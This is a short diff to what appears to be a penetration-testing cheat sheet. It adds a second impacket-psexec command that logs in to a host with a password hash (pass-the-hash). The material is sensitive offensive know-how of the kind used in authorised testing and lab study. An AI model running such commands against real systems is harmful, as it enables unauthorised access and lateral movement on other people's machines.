@@ -76,6 +76,7 @@ Use a hash to login (Pass-The-Hash).
 
 ```shell!
 $ impacket-psexec -hashes usernamehash:sessionhash username@IP
+$ impacket-psexec -hashes :hash username@IP
 ```
 
 <br>
